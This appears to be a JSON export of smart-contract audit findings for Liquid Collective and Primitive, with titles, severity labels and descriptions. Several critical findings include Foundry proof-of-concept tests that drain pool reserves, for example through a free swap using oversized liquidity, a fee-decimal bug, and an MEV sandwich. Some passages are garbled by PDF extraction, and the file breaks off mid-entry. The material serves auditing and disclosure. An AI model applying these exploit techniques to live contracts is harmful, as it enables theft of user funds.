        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "Oracle members would need to listen to ClearedReporting event and report their data if necessary",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "The only way for an oracle member to change its report data for an epoch is to reset the reporting process by changing its address",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "If an oracle member has made a mistake in its CL report to the Oracle or for some other reason would like to change its report, it would not be able to due to the following if block: // we retrieve the voting status of the caller, and revert if already voted if (ReportsPositions.get(uint256(memberIndex))) { revert AlreadyReported(report.epoch, msg.sender); } The only way for the said oracle member to be able to report different data is to reset its address by calling setMember. This would cause all the report variants and report positions to be cleared and force all the other oracle members to report their data again. Related:  Any oracle member can censor almost quorum report variants by resetting its address.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "For a quorum making CL report the epoch restrictions are checked twice.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "When an oracle member reports to the Oracle's reportConsensusLayerData, the requirements for a valid epoch is checked once in reportConsensusLayerData: // checks that the report epoch is not invalid if (!river.isValidEpoch(report.epoch)) { revert InvalidEpoch(report.epoch); } and once again in setConsensusLayerData // we start by verifying that the reported epoch is valid based on the consensus layer spec if (!_isValidEpoch(cls, report.epoch)) { revert InvalidEpoch(report.epoch); } Note that only the Oracle can call the setConsensusLayerData endpoint and the only time the Oracle makes this call is when the quorum is reached in reportConsensusLayerData.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Clear report variants and report position data during the migration to the new contracts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "Upon migration to the new contract with a new type of reporting data the old report positions and variants should be cleared by calling _clearReports() on the new contract or an older counterpart on the old contract. Note that the report variants slot will be changed from: bytes32(uint256(keccak256(\"river.state.reportsVariants\")) - 1) to: bytes32(uint256(keccak256(\"river.state.reportVariants\")) - 1)",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused functions from Oracle",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "The following functions are unused and can be removed from the Oracle's implementation  isValidEpoch  getTime  getExpectedEpochId  getLastCompletedEpochId  getCurrentEpochId  getCLSpec  getCurrentFrame  getFrameFirstEpochId  getReportBounds",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "RedeemManager. _claimRedeemRequests - Consider adding the recipient to the revert message in case of failure",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "The purpose of the _claimRedeemRequests function is to facilitate the claiming of ETH on behalf of another party who has a valid redeem request. It is worth noting that if any of the calls to recipients fail, the entire transaction will revert. Although it is impossible to conduct a denial-of-service (DoS) attack in this scenario, as the worst-case scenario only allows the transaction sender to specify a different array of redeemRequestIds, it may still be challenging to determine the specific redemption request that caused the transaction to fail.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Exit validator picking strategy does not consider slashed validator between reported epoch and current epoch",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "The current picking strategy in the OperatorsRegistry._pickNextValidatorsToExitFromActive- Operators function relies on a report from an old epoch. In between the reported epoch and the current epoch, validators might have been slashed and so the strategy might pick and signal to the operators those validators that have been slashed. As a result, the suggested number of validators to exit the protocol to compensate for the redemption demand in the next round of reports might not be exactly what was requested. Similarly, the OperatorsV2._hasExitableKeys function only evaluates based on a report from an old epoch. In between the reported epoch and the current epoch, validators might have been slashed. Thus, some returned operators might not have exitable keys in the current epoch.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Duplicated functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "_getStoppedValidatorsCountFromRawArray functions are the same. Operator.2._getStoppedValidatorCountAtIndex The and OperatorsRegistry.1. 30 function _getStoppedValidatorCountAtIndex(uint32[] storage stoppedValidatorCounts, uint256 if (index + 1 >= stoppedValidatorCounts.length) { return 0; } return stoppedValidatorCounts[index + 1]; function _getStoppedValidatorsCountFromRawArray(uint32[] storage stoppedValidatorCounts, internal view returns (uint32) index) File: Operators.2.sol 142: ,! 143: 144: 145: 146: 147: 148: 149: 150: 151: { } uint256 operatorIndex) internal view returns (uint32) File: OperatorsRegistry.1.sol 484: ,! 485: 486: 487: 488: 489: 490: 491: 492: 493: return 0; { } if (operatorIndex + 1 >= stoppedValidatorCounts.length) { } return stoppedValidatorCounts[operatorIndex + 1];",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Funds might be pulled from CoverageFundV1 even when there has been no slashing incident.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "vars.availableAmountToUpperBound might be positive even though no validators have been slashed. In this case, we still pull funds from the coverage funds contract to get closer to the upper bound limit: // if we have available amount to upper bound after pulling the exceeding eth buffer, we attempt to pull coverage funds ,! if (vars.availableAmountToUpperBound > 0) { // we pull the funds from the coverage recipient vars.trace.pulledCoverageFunds = _pullCoverageFunds(vars.availableAmountToUpperBound); // we do not update the rewards as coverage is not considered rewards // we do not update the available amount as there are no more pulling actions to perform afterwards } So it is possible the slashed coverage funds get used even when there has been no slashing to account for.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Update inline documentation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": " OracleManager.1.sol functions highlighted in Context are missing the @return natspec.  IOracle.1.sol#L204's highlighted comment is outdated. setMember can now also be called by the member itself. Also, there is a typo: adminitrator -> administrator. File: IOracle.1.sol 204: 209: /// @dev Only callable by the adminitrator @audit typo and outdated function setMember(address _oracleMember, address _newAddress) external; modifier onlyAdminOrMember(address _oracleMember) { if (msg.sender != _getAdmin() && msg.sender != _oracleMember) { revert LibErrors.Unauthorized(msg.sender); File: Oracle.1.sol 28: 29: 30: 31: 32: 33: ... 189: ,! } _; } function setMember(address _oracleMember, address _newAddress) external onlyAdminOrMember(_oracleMember) {",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document/mark unused (would-be-stale) storage parameters after migration",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "The following storage parameters will be unused after the migration of the protocol to v1  CLValidatorCount  CLValidatorTotalBalance  LastOracleRoundId.sol  OperatorsV1, this will be more than one slot (it occupies regions of storage)  ReportVariants, the slot has been changed (that means right after migration ReportVariants will be an empty array by default): bytes32(uint256(keccak256(\"river.state.reportsVariants\")) - 1); - bytes32 internal constant REPORTS_VARIANTS_SLOT = ,! + bytes32 internal constant REPORT_VARIANTS_SLOT ,! = bytes32(uint256(keccak256(\"river.state.reportVariants\")) - 1);",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "pullEth, pullELFees and pullExceedingEth do not check for a non-zero amount before sending funds to River",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "pullCoverageFunds makes sure that the amount sending to River is non-zero before calling its corresponding endpoint. This behavior differs from the implementations of  pullELFees  pullExceedingEth  pullEth 33 Not checking for a non-zero value has the added benefit of saving gas when the value is non-zero, while the check for a non-zero value before calling back River saves gas for cases when the amount could be 0.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Protocol fees are double-counted as registry balance and pool reserve",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "When swapping, the registry is credited a protocolFee. However, this fee is always reinvested in the pool, meaning the virtualX or virtualY pool reserves per liquidity increase by protocolFee / liquidity. The protocol fee is now double-counted as the registrys user balance and the pool reserve, while the global reserves are only increased by the protocol fee once in _increaseReserves(_state.tokenInput, iteration.input). A protocol fee breaks the invariant that the global reserve should be greater than the sum of user balances and fees plus the sum of pool reserves. As the protocol fee is reinvested, LPs can withdraw them. If users and LPs decide to withdraw all their balances, the registry cant withdraw their fees anymore. Conversely, if the registry withdraws the protocol fee, not all users can withdraw their balances anymore. // SPDX-License-Identifier: GPL-3.0-only pragma solidity ^0.8.4; import \"./Setup.sol\"; import \"forge-std/console2.sol\"; contract TestSpearbit is Setup { function test_protocol_fee_reinvestment() public noJit defaultConfig useActor usePairTokens(100e18) allocateSome(10e18) // deltaLiquidity isArmed { // Set fee, 1/5 = 20% SimpleRegistry(subjects().registry).setFee(address(subject()), 5); // swap // make invariant go negative s.t. all fees are reinvested, not strictly necessary vm.warp(block.timestamp + 1 days); uint128 amtIn = 1e18; bool sellAsset = true; uint128 amtOut = uint128(subject().getAmountOut(ghost().poolId, sellAsset, amtIn)); subject().multiprocess(FVMLib.encodeSwap(uint8(0), ghost().poolId, amtIn, amtOut, ,! uint8(sellAsset ? 1 : 0))); // deallocate and earn reinvested LP fees + protocol fees, emptying _entire_ reserve including protocol fees ,! subject().multiprocess( FVMLib.encodeAllocateOrDeallocate({ shouldAllocate: false, useMax: uint8(1), poolId: ghost().poolId, deltaLiquidity: 0 // useMax will set this to freeLiquidity }) ); subject().draw(ghost().asset().to_addr(), type(uint256).max, actor()); uint256 protocol_fee = ghost().balance(subjects().registry, ghost().asset().to_addr()); 5 assertEq(protocol_fee, amtIn / 100 / 5); // 20% of 1% of 1e18 // the global reserve is 0 even though the protocol fee should still exist uint256 reserve_asset = ghost().reserve(ghost().asset().to_addr()); assertEq(reserve_asset, 0); // reverts with InsufficientReserve(0, 2000000000000000) SimpleRegistry(subjects().registry).claimFee( address(subject()), ghost().asset().to_addr(), protocol_fee, address(this) ); } }",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "LP fees are in WAD instead of token decimal units",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "When swapping, deltaInput is in WAD (not token decimals) units. Therefore, feeAmount is also in WAD as a percentage of deltaInput. When calling _feeSavingEffects(args.poolId, iteration) to determine whether to reinvest the fees in the pool or earmark them for LPs, a _syncFeeGrowthAccumulator is done with the following parameter: _syncFeeGrowthAccumulator(FixedPointMathLib.divWadDown(iteration.feeAmount, iteration.liquidity)) This is a WAD per liquidity value stored in _state.feeGrowthGlobal and also in pool.feeGrowthGlobalAsset through a subsequent _syncPool call. If an LP claims now and their fees are synced with syncPositionFees, their tokensOwed is set to: uint256 differenceAsset = AssemblyLib.computeCheckpointDistance( feeGrowthAsset=pool.feeGrowthGlobalAsset, self.feeGrowthAssetLast ); feeAssetEarned = FixedPointMathLib.mulWadDown(differenceAsset, self.freeLiquidity); self.tokensOwedAsset += SafeCastLib.safeCastTo128(feeAssetEarned); Then tokensOwedAsset is increased by a WAD value (WAD per WAD liquidity multiplied by WAD liquidity) and they have credited this WAD value with _applyCredit(msg.sender, asset, claimedAssets) which they can then withdraw as a token decimal value. The result is that LP fees are credited and can be withdrawn as WAD units and tokens with fewer than 18 decimals can be stolen from the protocol. 6 // SPDX-License-Identifier: GPL-3.0-only pragma solidity ^0.8.4; import \"./Setup.sol\"; import \"forge-std/console2.sol\"; contract TestSpearbit is Setup { function test_fee_decimal_bug() public sixDecimalQuoteConfig useActor usePairTokens(31e18) allocateSome(100e18) // deltaLiquidity isArmed { // Understand current pool values. create pair initializes from price // DEFAULT_STRIKE=10e18 = 10.0 quote per asset = 1e7/1e18 = 1e-11 uint256 reserve_asset = ghost().reserve(ghost().asset().to_addr()); uint256 reserve_quote = ghost().reserve(ghost().quote().to_addr()); assertEq(reserve_asset, 30.859596948332370800e18); assertEq(reserve_quote, 308.595965e6); // Do swap from quote -> asset, so we catch fee on quote bool sellAsset = false; // amtIn is in quote. gets scaled to WAD in `_swap`. uint128 amtIn = 100; // 0.0001$ ~ 1e14 iteration.input uint128 amtOut = uint128(subject().getAmountOut(ghost().poolId, sellAsset, amtIn)); { } // verify that before swap, we have no credit uint256 credited = ghost().balance(actor(), ghost().quote().to_addr()); assertEq(credited, 0, \"token-credit\"); uint256 pre_swap_balance = ghost().quote().to_token().balanceOf(actor()); subject().multiprocess( FVMLib.encodeSwap( uint8(0), ghost().poolId, amtIn, amtOut, uint8(sellAsset ? 1 : 0) ) ); subject().multiprocess( // claim it all FVMLib.encodeClaim(ghost().poolId, type(uint128).max, type(uint128).max) ); // we got credited tokensOwed = 1% of 1e14 input = 1e12 quote tokens uint256 credited = ghost().balance(actor(), ghost().quote().to_addr()); assertEq(credited, 1e12, \"tokens-owed\"); // can withdraw the credited tokens, would underflow reserve, so just rug the entire reserve reserve_quote = ghost().reserve(ghost().quote().to_addr()); subject().draw(ghost().quote().to_addr(), reserve_quote, actor()); uint256 post_draw_balance = ghost().quote().to_token().balanceOf(actor()); // -amtIn because reserve_quote already got increased by it, otherwise we'd be double-counting assertEq(post_draw_balance, pre_swap_balance + reserve_quote - amtIn, ,! \"post-draw-balance-mismatch\"); 7 } }",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Swaps can be done for free and steal the reserve given large liquidity allocation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "A swap of inputDelta tokens for outputDelta tokens is accepted if the invariant after the swap did not decrease. The after-swap invariant is recomputed using the pools new virtual reserves (per liquidity) virtualX and virtualY: // becomes virtualX (reserveX) if swapping X -> Y nextIndependent = liveIndependent + deltaInput.divWadDown(iteration.liquidity); // becomes virtualY (reserveY) if swapping X -> Y nextDependent = liveDependent - deltaOutput.divWadDown(iteration.liquidity); // in checkInvariant int256 nextInvariant = RMM01Lib.invariantOf({ self: pools[poolId], R_x: reserveX, R_y: reserveY, timeRemainingSec: tau }); require(nextInvariantWad >= prevInvariant); When iteration.liquidity is sufficiently large the integer division deltaOutput.divWadDown(iteration.liquidity) will return 0, resulting in an unchanged pool reserve instead of a decreased one. The invariant check will pass even without transferring any input amount deltaInput as the reserves are unchanged. The swapper will be credited deltaOutput tokens. The attacker needs to first increase the liquidity to a large amount (>2**126 in the POC) such that they can steal the entire asset reserve (100e18 asset tokens in the POC): This can be done using multiprocess to: 1. allocate > 1.1e38 liquidity. 2. swap with input = 1 (to avoid the 0-swap revert) and output = 100e18. The new virtualX asset will be liveDependent - deltaOutput.divWadDown(iteration.liquidity) = liveDependent computed - 100e18 * 1e18 / 1.1e38 = liveDependent - 0 = liveDependent, leaving the virtual pool reserves unchanged and passing the invariant check. This credits 100e18 to the attacker when settled, as the global reserves (__account__.reserve) are decreased (but not the actual contract balance). as 3. deallocate the > 1.1e38 free liquidity again. As the virtual pool reserves virtualX/Y remained unchanged throughout the swap, the same allocated amount is credited again. Therefore, the allocation / deallocation doesnt require any token settlement. 4. settlement is called and the attacker needs to pay the swap input amount of 1 wei and is credited the global reserve decrease of 100e18 assets from the swap. Note that this attack requires a JIT parameter of zero in order to deallocate in the same block as the allocation. However, given sufficient capital combined with an extreme strike price or future cross-block flashloans, this attack 8 is also possible with JIT > 0. Attackers can perform this attack in their own pool with one malicious token and one token they want to steal. The malicious token comes with functionality to disable anyone else from trading so the attacker is the only one who can interact with their custom pool. This reduces any risk of this attack while waiting for the deallocation in a future block. // SPDX-License-Identifier: GPL-3.0-only pragma solidity ^0.8.4; import \"./Setup.sol\"; import \"contracts/libraries/RMM01Lib.sol\"; import \"forge-std/console2.sol\"; contract TestSpearbit is Setup { using RMM01Lib for PortfolioPool; // sorry, didn't know how to use the modifiers for testing 2 actors at the same time function test_virtual_reserve_unchanged_bug() public noJit defaultConfig { /////// SETUP /////// uint256 initialBalance = 100 * 1e18; address victim = address(actor()); vm.startPrank(victim); // we want to steal the victim's asset ghost().asset().prepare(address(victim), address(subject()), initialBalance); subject().fund(ghost().asset().to_addr(), initialBalance); vm.stopPrank(); // we need to prepare a tiny quote balance for attacker because we cannot set input = 0 for a swap ,! address attacker = address(0x54321); addGhostActor(attacker); setGhostActor(attacker); vm.startPrank(attacker); ghost().quote().prepare(address(attacker), address(subject()), 2); vm.stopPrank(); uint256 maxVirtual; { // get the virtualX/Y from pool creation PortfolioPool memory pool = ghost().pool(); (uint256 x, uint256 y) = pool.getVirtualPoolReservesPerLiquidityInWad(); console2.log(\"getVirtualPoolReservesPerLiquidityInWad: %s \\t %y \\t %s\", x, y); maxVirtual = y; } /////// ATTACK /////// // attacker provides max liquidity, swaps for free, removes liquidity, is credited funds vm.startPrank(attacker); bool sellAsset = false; uint128 amtIn = 1; uint128 amtOut = uint128(initialBalance); // victim's funds bytes[] memory instructions = new bytes[](3); uint8 counter = 0; instructions[counter++] = FVMLib.encodeAllocateOrDeallocate({ shouldAllocate: true, useMax: uint8(0), poolId: ghost().poolId, // getPoolLiquidityDeltas(int128 deltaLiquidity) does virtualY.mulDivUp(delta, scaleDownFactorAsset).safeCastTo128() ,! // virtualY * deltaLiquidity / 1e18 <= uint128.max => deltaLiquidity <= uint128.max * 1e18 ,! / virtualY. 9 // this will end up supplying deltaLiquidity such that the uint128 cast on deltaQuote won't overflow (deltaQuote ~ uint128.max) ,! // deltaLiquidity = 110267925102637245726655874254617279807 > 2**126 deltaLiquidity: uint128((uint256(type(uint128).max) * 1e18) / maxVirtual) }); // the main issue is that the invariant doesn't change, so the checkInvariant passes // the reason why the invariant doesn't change is because the virtualX/Y doesn't change // the reason why virtualY doesn't change even though we have deltaOutput = initialBalance (100e18) ,! // is that the previous allocate increased the liquidity so much that: // nextDependent = liveDependent - deltaOutput.divWadDown(iteration.liquidity) = liveDependent // the deltaOutput.divWadDown(iteration.liquidity) is 0 because: // 100e18 * 1e18 / 110267925102637245726655874254617279807 = 1e38 / 1.1e38 = 0 instructions[counter++] = FVMLib.encodeSwap(uint8(0), ghost().poolId, amtIn, amtOut, uint8(sellAsset ? 1 : 0)); ,! instructions[counter++] = FVMLib.encodeAllocateOrDeallocate({ shouldAllocate: false, useMax: uint8(1), poolId: ghost().poolId, deltaLiquidity: 0 // useMax makes us deallocate our entire freeLiquidity }); subject().multiprocess(FVM.encodeJumpInstruction(instructions)); uint256 attacker_asset_balance = ghost().balance(attacker, ghost().asset().to_addr()); assertGt(attacker_asset_balance, 0); console2.log(\"attacker asset profit: %s\", attacker_asset_balance); // attacker can withdraw victim's funds, leaving victim unable to withdraw subject().draw(ghost().asset().to_addr(), type(uint256).max, actor()); uint256 attacker_balance = ghost().asset().to_token().balanceOf(actor()); // rounding error of 1 assertEq(attacker_balance, initialBalance - 1, \"attacker-post-draw-balance-mismatch\"); vm.stopPrank(); } }",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Unsafe type-casting",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "Throughout the contract weve encountered various unsafe type-castings.  invariant Within the _swap function, the next invariant is a int256 variable and is calculated within the checkInvariant function implemented in the RMM01Portfolio. This variable then is dangerously typecasted to int128 and assigned to a int256 variable in the iteration struct (L539). The down-casting from int256 to int128 assumes that the nextInvariantWad fits in a int128, in case it wont fit, it will overflow. The updated iteration object is passed to the _feeSavingEffects function, which based on the RMM implementation can lead to bad consequences.  iteration.nextInvariant  _getLatestInvariantAndVirtualPrice  getNetBalance During account settlement, getNetBalance is called to compute the difference between the \"physical reserves\" (contract balance) and the internal reserves: net = int256(physicalBalance) - int256(internalBalance). If the internalBalance > int256.max, it overflows into a negative value and the attacker is credited the entire physical balance + overflow upon settlement (and doesnt have to pay anything in settle). This might happen if an attacker allocates or swaps in very high amounts before settlement is called. Consider doing a safe typecast here as a legitimate possible revert would cause less issues than an actual overflow.  getNetBalance 11  Encoding / Decoding functions The encoding and decoding functions in FVMLib perform many unsafe typecasts and will truncate values. This can result in a user calling functions with unexpected parameters if they use a custom encoding. Consider using safe type-casts here.  encodeJumpInstruction: cannot encode more than 255 instructions, instructions will be cut off and they might perform an action that will then be settled unfavorably.  decodeClaim: fee0/fee1 can overflow  decodeCreatePool: price := mul(base1, exp(10, power1)) can overflow and pool is initialized wrong  decodeAllocateOrDeallocate: deltaLiquidity := mul(base, exp(10, power)) can overflow would pro- vide less liquidity  decodeSwap: input / output := mul(base1, exp(10, power1)) can overflow, potentially lead to unfavor- able swaps  Other  PortfolioLib.getPoolReserves: int128(self.liquidity). This could be a safe typecast, the function is not used internally.  AssemblyLib.toAmount: The typecast works if power < 39, otherwise leads to wrong results without revert- ing. This function is not used yet but consider performing a safe typecast here.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Protocol fees are in WAD instead of token decimal units",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "When swapping, deltaInput is in WAD (not token decimals) units. Therefore, the protocolFee will also be in WAD as a percentage of deltaInput. This WAD amount is then credited to the REGISTRY: iteration.feeAmount = (deltaInput * _state.fee) / PERCENTAGE; if (_protocolFee != 0) { uint256 protocolFeeAmount = iteration.feeAmount / _protocolFee; iteration.feeAmount -= protocolFeeAmount; _applyCredit(REGISTRY, _state.tokenInput, protocolFeeAmount); } The privileged registry can claim these fees using a withdrawal (draw) and the WAD units are not scaled back to token decimal units, resulting in withdrawing more fees than they should have received if the token has less than 18 decimals. This will reduce the global reserve by the increased fee amount and break the accounting and functionality of all pools using the token.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Invariant.getX computation is wrong",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The protocol makes use of a solstat library to compute the off-chain swap amounts. The solstats Invariant.getX function documentation states: Computes x in x = 1 - (( (y + k) / K ) + ). However, the y + k term should be y - k. The off-chain swap amounts computed via getAmountOut return wrong values. Using these values for an actual swap transaction will either (wrongly) revert the swap or overstate the output amounts. Derivation: y = K (cid:8) (cid:0)(cid:8)(cid:0)1(1 (cid:8)(cid:0)1(y (cid:0) (cid:8) (cid:0)(cid:8)(cid:0)1(y x) (cid:27)p(cid:28) (cid:1) + k (cid:0) (cid:0) k )=K = (cid:8)(cid:0)1(1 x) (cid:27)p(cid:28) (cid:0) k)=K + (cid:27)p(cid:28) (cid:1) = 1 (cid:0) x (cid:0) (cid:0) (cid:8) (cid:0)(cid:8)(cid:0)1(y x = 1",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Liquidity can be (de-)allocated at a bad price",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "To allocate liquidity to a pool, a single uint128 liquidityDelta parameter is specified. The re- quired deltaAsset and deltaQuote token amounts are computed from the current virtualX and virtualY token reserves per liquidity (prices). An MEV searcher can sandwich the allocation transaction with swaps that move the price in an unfavorable way, such that, the allocation happens at a time when the virtualX and virtualY variables are heavily skewed. The MEV searcher makes a profit and the liquidity provider will automatically be forced to use undesired token amounts. In the provided test case, the MEV searcher makes a profit of 2.12e18 X and the LP uses 9.08e18 X / 1.08 Y instead of the expected 3.08 X / 30.85 Y. LPs will incur a loss, especially if the asset (X) is currently far more valuable than the quote (Y). // SPDX-License-Identifier: GPL-3.0-only pragma solidity ^0.8.4; import \"./Setup.sol\"; import \"contracts/libraries/RMM01Lib.sol\"; import \"forge-std/console2.sol\"; contract TestSpearbit is Setup { using RMM01Lib for PortfolioPool; // sorry, didn't know how to use the modifiers for testing 2 actors at the same time function test_allocate_sandwich() public defaultConfig { uint256 initialBalance = 100e18; address victim = address(actor()); address mev = address(0x54321); ghost().asset().prepare(address(victim), address(subject()), initialBalance); ghost().quote().prepare(address(victim), address(subject()), initialBalance); addGhostActor(mev); setGhostActor(mev); vm.startPrank(mev); // need to prank here for approvals in `prepare` to work ghost().asset().prepare(address(mev), address(subject()), initialBalance); ghost().quote().prepare(address(mev), address(subject()), initialBalance); vm.stopPrank(); vm.startPrank(victim); subject().fund(ghost().asset().to_addr(), initialBalance); subject().fund(ghost().quote().to_addr(), initialBalance); vm.stopPrank(); vm.startPrank(mev); subject().fund(ghost().asset().to_addr(), initialBalance); subject().fund(ghost().quote().to_addr(), initialBalance); vm.stopPrank(); // 0. some user provides initial liquidity, so MEV can actually swap in the pool vm.startPrank(victim); subject().multiprocess( FVMLib.encodeAllocateOrDeallocate({ shouldAllocate: true, useMax: uint8(0), 14 poolId: ghost().poolId, deltaLiquidity: 10e18 }) ); vm.stopPrank(); // 1. MEV swaps, changing the virtualX/Y LP price (skewing the reserves) vm.startPrank(mev); uint128 amtIn = 6e18; bool sellAsset = true; uint128 amtOut = uint128(subject().getAmountOut(ghost().poolId, sellAsset, amtIn)); subject().multiprocess(FVMLib.encodeSwap(uint8(0), ghost().poolId, amtIn, amtOut, uint8(sellAsset ? 1 : 0))); ,! vm.stopPrank(); // 2. victim allocates { uint256 victim_asset_balance = ghost().balance(victim, ghost().asset().to_addr()); uint256 victim_quote_balance = ghost().balance(victim, ghost().quote().to_addr()); vm.startPrank(victim); subject().multiprocess( FVMLib.encodeAllocateOrDeallocate({ shouldAllocate: true, useMax: uint8(0), poolId: ghost().poolId, deltaLiquidity: 10e18 }) ); vm.stopPrank(); PortfolioPool memory pool = ghost().pool(); (uint256 x, uint256 y) = pool.getVirtualPoolReservesPerLiquidityInWad(); console2.log(\"getVirtualPoolReservesPerLiquidityInWad: %s \\t %y \\t %s\", x, y); victim_asset_balance -= ghost().balance(victim, ghost().asset().to_addr()); victim_quote_balance -= ghost().balance(victim, ghost().quote().to_addr()); console2.log( \"victim used asset/quote for allocate: %s \\t %y \\t %s\", victim_asset_balance, victim_quote_balance ); // w/o sandwich: 3e18 / 30e18 } // 3. MEV swaps back, ending up with more tokens than their initial balance vm.startPrank(mev); sellAsset = !sellAsset; amtIn = amtOut; // @audit-issue this only works after patching Invariant.getX to use y - k. still need to reduce the amtOut a tiny bit because of rounding errors ,! amtOut = uint128(subject().getAmountOut(ghost().poolId, sellAsset, amtIn)) * (1e4 - 1) / 1e4; subject().multiprocess(FVMLib.encodeSwap(uint8(0), ghost().poolId, amtIn, amtOut, uint8(sellAsset ? 1 : 0))); ,! vm.stopPrank(); uint256 mev_asset_balance = ghost().balance(mev, ghost().asset().to_addr()); uint256 mev_quote_balance = ghost().balance(mev, ghost().quote().to_addr()); assertGt(mev_asset_balance, initialBalance); assertGe(mev_quote_balance, initialBalance); console2.log( \"MEV asset/quote profit: %s \\t %s\", mev_asset_balance - initialBalance, mev_quote_balance - ,! initialBalance ); } 15 }",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Missing signextend when dealing with non-full word signed integers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The AssemblyLib is using non-full word signed integers operations. If the signed data in the stack have not been signextend the twos complement arithmetic will not work properly, most probably reverting. The solidity compiler does this cleanup but this cleanup is not guaranteed to be done while using the inline assem- bly.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Tokens With Multiple Addresses Can Be Stolen Due to Reliance on balanceOf",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "Some ERC20 tokens have multiple valid contract addresses that serve as entrypoints for manipulat- ing the same underlying storage (such as Synthetix tokens like SNX and sBTC and the TUSD stablecoin). Because the FVM holds all tokens for all pools in the same contract, assumes that a contract address is a unique identifier for a token, and relies on the return value of balanceOf for manipulated tokens to determine what transfers are needed during transaction settlement, multiple entrypoint tokens are not safe to be used in pools. For example, suppose there is a pool with non-zero liquidity where one token has a second valid address. An attacker can atomically create a second pool using the alternate address, allocate liquidity, and then immediately deallocate it. During execution of the _settlement function, getNetBalance will return a positive net balance for the double entrypoint token, crediting the attacker and transferring them the entire balance of the double entrypoint token. This attack only costs gas, as the allocation and deallocation of non-double entrypoint tokens will cancel out.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Swap amounts are always estimated with priority fee",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "A pool can have a priority fee that is only applied when the pool controller (contract) performs a swap. However, when estimating a swap with getAmountOut the priority fee will always be applied as long as there is a controller and a priority fee. As the priority fee is usually less than the normal fee, the input amount will be underestimated for non-controllers and the input amount will be too low and the swap reverts.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Rounding functions are wrong for negative integers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
